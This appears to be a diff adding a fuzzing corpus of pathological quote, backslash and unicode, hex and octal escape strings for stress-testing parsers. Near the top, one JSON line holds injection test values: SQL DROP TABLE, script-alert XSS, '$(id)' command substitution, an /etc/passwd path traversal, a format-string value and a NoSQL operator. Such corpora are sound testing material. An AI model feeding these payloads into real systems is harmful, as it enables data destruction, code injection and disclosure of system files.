+%00%01%0a%0d%22%27%26%23%2f%5c%3c%3e%7b%7d%5b%5d%24%40%21%3f%2a%2b%3d
+\\u0000\\u0001\\u000a\\u000d\\u0022\\u0027\\u0026\\u0023\\u002f\\u005c\\u003c\\u003e
+{"sql":"'; DROP TABLE x;--","xss":"<script>alert(1)</script>","cmd":"$(id)","path":"../../../etc/passwd","fmt":"%s%n","nosql":{"$gt":""},"template":"${HOME}"}
+
+# ============================================================================
+# WEIRD QUOTE COMBINATIONS - COMPREHENSIVE
+# ============================================================================
+"
+'
+\"
+\'
+""
+''
+\"\"
+\'\'
+"'
+'"
+\"\'
+\'\"
+"'"
+'"'
+\"\'\"
+\'\"\'
+"'\"
+'\"'
+\"\'\\
+\'\"\\
+"\"'
+'\'\"
+"\""
+'\''
+\"\\\"
+\'\\\'
+"'\""
+'\"''
+\"\'\\\"
+\'\"\\'
+""''
+''""
+\"\"\'\'
+\'\'\"\"
+"''"
+'""'
+\"\'\'\"
+\'\"\"\'
+"''\"
+'\"\"'
+\"\'\'\\\"
+\'\"\"\\'
+"""
+'''
+\"\"\"
+\'\'\'
+"'''
+'"""
+\"\'\'\'
+\'\"\"\"
+""'''
+''"""
+\"\"\'\'\'
+\'\'\"\"\"
+"'\"'"
+'"'\""
+\"\'\\\"\'\"
+\'\"\\'\"\'
+"\"'\"'"
+'\'\"'\""
+\"\\\"\'\\\"\'\"
+\'\\\'\"\\\'\"\'
+"'"'"'"
+'"'"'"'
+\"\'\"\'\"\'\"
+\'\"\'\"\'\"\'
+"'\"'\"'"
+'"'\"'\"'"
+\"\'\\\"\'\\\"\'\"
+\'\"\\'\"\\'\"\'
+""""
+''''
+\"\"\"\"
+\'\'\'\'
+"''''"
+'""""'
+\"\'\'\'\'\'
+\'\"\"\"\"\"
+""''''""
+''""""''
+\"\"\'\'\'\'\"\"
+\'\'\"\"\"\"\'\'
+"\"\"''\"\""
+'\'\'\"\"\'\'\"
+\"\\\"\\\"\'\'\\\"\\\"\"
+\'\\\'\\\'\"\"\\\'\\\'\'
+"'\"\"''\"\"'"
+'"\'\'\"\"\'\'\"'
+\"\'\\\"\\\"\'\'\\\"\\\"\'\"
+\'\"\\'\\'\"\"\\'\\'\"\'
+
+# ============================================================================
+# ESCAPE CHARACTER STRESS TESTS
+# ============================================================================
+\
+\\
+\\\
+\\\\
+\\\\\
+\\\\\\
+\\\\\\\
+\\\\\\\\
+\\\\\\\\\\
+\\\\\\\\\\\\
+\\\\\\\\\\\\\\\\
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+\n
+\\n
+\\\n
+\\\\n
+\\\\\n
+\\\\\\n
+\\\\\\\n
+\\\\\\\\n
+\t
+\\t
+\\\t
+\\\\t
+\\\\\t
+\\\\\\t
+\r
+\\r
+\\\r
+\\\\r
+\\\\\r
+\\\\\\r
+\b
+\\b
+\\\b
+\\\\b
+\f
+\\f
+\\\f
+\\\\f
+\v
+\\v
+\\\v
+\\\\v
+\0
+\\0
+\\\0
+\\\\0
+\"
+\\\"
+\\\"\
+\\\\\"
+\"\\
+\"\\\
+\"\\\\
+\"\\\\\
+\'
+\\\'
+\\\'\
+\\\\\'
+\'\\
+\'\\\
+\'\\\\
+\'\\\\\
+\n\t\r\b\f
+\\n\\t\\r\\b\\f
+\\\n\\\t\\\r\\\b\\\f
+\\\\n\\\\t\\\\r\\\\b\\\\f
+\"\'\\\n\t\r
+\\\"\\\'\\\\\\n\\t\\r
+\\\"\\\'\\\\\\\n\\\t\\\r
+\\\\\"\\\\'\\\\\\\\\\\\n\\\\t\\\\r
+
+# ============================================================================
+# MIXED QUOTE-ESCAPE PATHOLOGICAL CASES
+# ============================================================================
+"\\
+'\\
+\"\\\\
+\'\\\\
+"\\\
+'\\\
+\"\\\\\\
+\'\\\\\\
+"\\\\
+'\\\\
+\"\\\\\\\\
+\'\\\\\\\\
+"\\"
+'\\'
+\"\\\\\"\
+\'\\\\'\
+"\\'"
+'\\\"'
+\"\\\\\'\\\"
+\'\\\\\"\\\'
+"\\'\\"
+'\\\"\\'
+\"\\\\\'\\\\\\\"
+\'\\\\\"\\\\\\\'
+"\\'\\'\\"
+'\\\"\\\"\\'
+\"\\\\\'\\\\\'\\\\\\\"
+\'\\\\\"\\\\\"\\\\\\\'
+"he said \"hello\""
+'she said \'hello\''
+\"he said \\\"hello\\\"\"
+\'she said \\\'hello\\\'\'
+"he said \"it's\""
+'she said \'it\"s\''
+\"he said \\\"it\\'s\\\"\"
+\'she said \\\'it\\\"s\\\'\'
+"path\\to\\\"file\""
+'path\\to\\'file\''
+\"path\\\\to\\\\\\\"file\\\"\"
+\'path\\\\to\\\\\\\'file\\\'\'
+"c:\\users\\"admin"\\"
+'c:\\users\\'admin'\\'
+\"c:\\\\users\\\\\\\"admin\\\"\\\\\"
+\'c:\\\\users\\\\\\\'admin\\\'\\\\\'
+"json: {\"key\": \"val\"}"
+'json: {\'key\': \'val\'}'
+\"json: {\\\"key\\\": \\\"val\\\"}\"
+\'json: {\\\'key\\\': \\\'val\\\'}\'
+"nested \"json: {\\\"k\\\": \\\"v\\\"}\""
+'nested \'json: {\\\'k\\\': \\\'v\\\'}\''
+\"nested \\\"json: {\\\\\\\"k\\\\\\\": \\\\\\\"v\\\\\\\"}\\\"\"\
+\'nested \\\'json: {\\\\\\\'k\\\\\\\': \\\\\\\'v\\\\\\\'}\\\'\'
+
+# ============================================================================
+# ALTERNATING QUOTE PATTERNS
+# ============================================================================
+"'"'"'"'"'"'"'"'"'"'"'"'"'"'"'"'"'"'"'"'"'"'"'"'"'"
+'"'"'"'"'"'"'"'"'"'"'"'"'"'"'"'"'"'"'"'"'"'"'"'"'
+\"\'\"\'\"\'\"\'\"\'\"\'\"\'\"\'\"\'\"\'\"\'\"\'\"
+\'\"\'\"\'\"\'\"\'\"\'\"\'\"\'\"\'\"\'\"\'\"\'\"\'
+"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"
+'"'\"\''\"'\"\''\"'\"\''\"'\"\''\"'\"\''\"'\"\''\"
+\"\'\\\"\'\\\"\'\\\"\'\\\"\'\\\"\'\\\"\'\\\"\'\\\"\'\"
+\'\"\\'\"\\'\"\\'\"\\'\"\\'\"\\'\"\\'\"\\'\"\\'\"\'
+"\"\"\"'''''\"\"\"'''''\"\"\"'''''\"\"\"'''''\"\"\"
+'''''\"\"\"'''''\"\"\"'''''\"\"\"'''''\"\"\"'''''"
+\"\\\"\\\"\\\"\'\'\'\'\'\\\"\\\"\\\"\'\'\'\'\'\"
+\'\'\'\'\'\\\"\\\"\\\"\'\'\'\'\'\\\"\\\"\\\"\'\'
+
+# ============================================================================
+# QUOTE-ESCAPE BOUNDARY CONDITIONS
+# ============================================================================
+starts with quote"
+starts with quote'
+starts with escape\
+starts with escaped quote\"
+starts with escaped quote\'
+starts with double escape\\
+"ends with quote
+'ends with quote
+\ends with escape
+\"ends with escaped quote
+\'ends with escaped quote
+\\ends with double escape
+"surrounded"
+'surrounded'
+\"escaped surrounded\"
+\'escaped surrounded\'
+\\escaped surrounded\\
+"'mixed'"
+'"mixed"'
+\"\'mixed\'\"
+\'\"mixed\"\'
+\\\"mixed\\\"\\
+\\'mixed\\'\\
+quote"in"middle
+quote'in'middle
+escape\in\middle
+escaped\"in\"middle
+escaped\'in\'middle
+double\\in\\middle
+"multi"ple"quotes"in"string
+'multi'ple'quotes'in'string
+\"multi\"ple\"quotes\"in\"string
+\'multi\'ple\'quotes\'in\'string
+\\multi\\ple\\escapes\\in\\string
+"'\"mix'\"'ed\"'quotes\"\\'and\\\"escapes'\"\\'
+
+# ============================================================================
+# UNICODE ESCAPE SEQUENCES WITH QUOTES
+# ============================================================================
+\\u0022
+\\u0027
+\\u005c
+\\u0022\\u0027
+\\u0027\\u0022
+\\u005c\\u0022
+\\u005c\\u0027
+\\u0022\\u005c\\u0027
+\\u0027\\u005c\\u0022
+"\\u0022"
+'\\u0027'
+\"\\u0022\"
+\'\\u0027\'
+"contains \\u0022 quote"
+'contains \\u0027 quote'
+"contains \\u005c backslash"
+'contains \\u005c backslash'
+\\u0022\\u0022\\u0022
+\\u0027\\u0027\\u0027
+\\u005c\\u005c\\u005c
+\\u0022\\u0027\\u005c\\u0022\\u0027\\u005c
+
+# ============================================================================
+# HEX ESCAPE SEQUENCES WITH QUOTES
+# ============================================================================
+\\x22
+\\x27
+\\x5c
+\\x22\\x27
+\\x27\\x22
+\\x5c\\x22
+\\x5c\\x27
+"\\x22"
+'\\x27'
+\"\\x22\"
+\'\\x27\'
+"contains \\x22 quote"
+'contains \\x27 quote'
+"contains \\x5c backslash"
+'contains \\x5c backslash'
+\\x22\\x22\\x22
+\\x27\\x27\\x27
+\\x5c\\x5c\\x5c
+\\x22\\x27\\x5c\\x22\\x27\\x5c
+
+# ============================================================================
+# OCTAL ESCAPE SEQUENCES WITH QUOTES
+# ============================================================================
+\\042
+\\047
+\\134
+\\042\\047
+\\047\\042
+\\134\\042
+\\134\\047
+"\\042"
+'\\047'
+\"\\042\"
+\'\\047\'
+"contains \\042 quote"
+'contains \\047 quote'
+"contains \\134 backslash"
+'contains \\134 backslash'
+\\042\\042\\042
+\\047\\047\\047
+\\134\\134\\134
+\\042\\047\\134\\042\\047\\134
+
+# ============================================================================
+# QUOTE-HEAVY REAL WORLD PATTERNS
+# ============================================================================
+{"key": "value with \"quotes\""}
+{'key': 'value with \'quotes\''}
+{\"key\": \"value with \\\"quotes\\\"\"}
+{\'key\': \'value with \\\'quotes\\\'\'}
+SELECT * FROM users WHERE name = 'O\'Brien'
+SELECT * FROM users WHERE name = \"O\\\"Brien\"
+<div title="contains \"quotes\"">text</div>
+<div title='contains \'quotes\''>text</div>
+console.log("He said \"Hello\"")
+console.log('He said \'Hello\'')
+path = "C:\\Users\\\"Admin\"\\file"
+path = 'C:\\Users\\\'Admin\'\\file'
+regex = /^"[^"]*"|'[^']*'$/
+regex = \"^\\\"[^\\\"]*\\\"|'[^']*'$\"
+cmd = "echo \"hello 'world'\""
+cmd = 'echo \'hello \"world\"\''
+json = "{\"nested\": \"{\\\"deep\\\": \\\"value\\\"}\"}"
+xml = '<tag attr="val with &quot;quotes&quot;">text</tag>'
+sql = "INSERT INTO t VALUES('it''s', \"quote\"\"s\")"
+shell = "echo 'single' \"double\" \\'escaped\\' \\\"escaped\\\""
+
+# ============================================================================
+# EXTREME NESTING DEPTH
+# ============================================================================
+"\"\\\"\\\\\\\"\\\\\\\\\\\\\\\"level7\\\\\\\\\\\\\\\"\\\\\\\"\\\\\"\\\"\""
+'\'\\\'\\\\\\\'\\\\\\\\\\\\\\\'level7\\\\\\\\\\\\\\\'\\\\\\\'\\\\\'\\\'\'
+{"a":{"b":{"c":{"d":{"e":{"f":"\\\"deep\\\""}}}}} }
+['a',['b',['c',['d',['e',['f','\\'deep\\'']]]]]]}
+"outer\"inner\\\"deeper\\\\\\\"deepest\\\\\\\"\\\"\""
+'outer\'inner\\\'deeper\\\\\\\'deepest\\\\\\\'\\\'\'
+
+# ============================================================================
+# WHITESPACE WITH QUOTES AND ESCAPES
+# ============================================================================
+" "
+' '
+"  "
+'  '
+"\t"
+'\t'
+"\n"
+'\n'
+"\r\n"
+'\r\n'
+" \" "
+' \' '
+" \\ "
+' \\ '
+"\t\"\t"
+'\t\'\t'
+"\n\"\n"
+'\n\'\n'
+"  \"  \"  "
+'  \'  \'  '
+" \t \n \r \" \' \\ "
+' \t \n \r \" \' \\ '
+leading" space
+leading' space
+"trailing space "
+'trailing space '
+"  leading and trailing  "
+'  leading and trailing  '
+" spaces \" around \" quotes "
+' spaces \' around \' quotes '
